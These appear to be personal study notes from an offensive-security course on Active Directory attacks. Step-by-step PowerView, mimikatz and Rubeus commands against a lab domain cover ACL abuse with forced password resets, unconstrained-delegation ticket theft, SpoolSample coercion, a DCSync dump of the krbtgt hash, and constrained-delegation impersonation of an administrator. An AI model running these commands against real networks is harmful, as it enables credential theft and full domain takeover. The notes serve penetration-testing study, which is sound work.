## AD Object Security Permissions

In active Drictory, access to an object is controlled through a Discretionary Access Control List(DACL), which consists of a series of Access Control Entries(ACE).  When multiple ACE's are present, their order is important. If a deny ACE comes before an allow ACE, the dent takes precedence. 

The ACE is stored arccording to the Secutiry Descriptor Definition Language(SDDL).
- ace_type:designates whether the ACE allows or denies permissions
- ace_flags:related to inheritance on child objects
- ace_rights
- object_guid
- inherit_object_guid
- account_sid:SID of the object

```
(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)
```
We can reference the [microsoft doc](https://docs.microsoft.com/en-us/windows/win32/secauthz/generic-access-rights) to read/understand the access rights

we cab enumernate the AD OBJ with Get-ObjectAcl, the foreach resolve the SID through ConvertFrom-SID

```
PS C:\tools> Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

#### Generuic All abuse

import powerview
```
PS C:\tools> . .\powerview.ps1
```

The GenericAll access right, which gives full control of the targeted object. 

We can get enumerate all domain users that our current account has GenericAll rights to it, or we can replace **Get-DomainGroup** to find a group 

```
PS C:\tools> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

if we found an account that we have access to it, we can update the password, we can do the samething with **ForceChangePassword** and **AllExtendedRights** access rights to change the password of a user account in a similar way without supplying the old password.
```
PS C:\tools> net user testservice1 pass /domain
```

if our user has **WriteDacl** permission to a AD object, we can use Add-DomainObjectAcl PowerView method to apply additional access rights
such as GenericAll, GenericWrite, or even DCSync if the targeted object is the domain object

```
PS C:\tools> Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
```
#### Kerberos Unconstrained Delegation

When the user requests access for a service ticket against a service that uses unconstrained
delegation, the request also includes a forwardable TGT. Since the frontend service receives a forwardable TGT, it can perform authentication on behalf of
the user to any service. this means that if we succeed in compromising the web server service and a user authenticates to it, we can steal the user’s TGT and authenticate to any service.

Identify Unconstrained computer
```
PS C:\tools> Get-DomainComputer -Unconstrained
```
dump the tickets
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

identify the admin TGT, and ptt, and exit sapwn a cmd shell with the ticket
```
mimikatz # kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
mimikatz # exit

C:\Tools> C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
```
#### force \pipe\spoolss authenticatin

we can to force a Domain Controller to connect back to a system configured with unconstrained
delegation, using the spoolSample tool

- 1.verify if the name pipe exists
```
PS C:\Tools> dir \\cdc01\pipe\spoolss
```

- 2.on the Unconstrained server setup monitor to catch the incoming tgt
```
C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$
```

- 3.trigger the print spooler change notification with SpoolSample.exe
```
C:\Tools> SpoolSample.exe CDC01 APPSRV01
```

- 4.inject ticket to memeory
```
C:\Tools> Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
```
- 5.dcsync, dump hashs
```
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

#### Constrained Delegation
Constrained delegation is configured on the computer or user object. It is set through the msdsallowedtodelegateto
property by specifying the SPNs the current object is allowed constrained delegation against.

We can use powerview again to query **TrustedToAuth** flag, which will enumerate constrained delegation:
```
PS C:\tools> Get-DomainUser -TrustedToAuth

samaccountname : IISSvc

msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS,
MSSQLSvc/cdc01.prod.corp1.com:1433}

useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD,
TRUSTED_TO_AUTH_FOR_DELEGATION
```
msds-allowedtodelegateto property contains the SPN of the MS SQL server
on CDC01. This tells us that constrained delegation is only allowed to that SQL server

TRUSTED_TO_AUTH_FOR_DELEGATION indicate whether constrained delegation can be used if the
authentication between the user and the service uses a different authentication mechanism like
NTLM

in this case,IISSvc account can request a service ticket for the services listed in the
msds-allowedtodelegateto field as any user in the domain.

Note, we do not need to execute in the context of the IISSvc account in order to exploit the
account. We only need the password hash.

- 1.Create hash from iiSSvc account 
```
PS C:\Tools> .\Rubeus.exe hash /password:lab
...
[*] Action: Calculate Password Hash(es)
[*] Input password : lab
[*] rc4_hmac : 2892D26CDF84D7A70E2EB3B9F05C425E
```

- 2.generate a TGT for IISSvc
```
PS C:\Tools> .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```

- 3.pass the ticket with base 64 encoded ticket,supply the SPN of the service (/msdsspn),
```
PS C:\Tools> .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
```

#### Resource-Based Constrained Delegation

RBCD works by essentially turning the delegation settings around. The msDSAllowedToActOnBehalfOfOtherIdentity
property  controls delegation from the backend service.
To configure RBCD, the SID of the frontend service is written to the new property of the backend
service. One important requirement is that the frontend service must have an SPN set in the domain. This means that
any attack against RBCD needs to happen from a computer account or a service account with a
SPN.

page 632
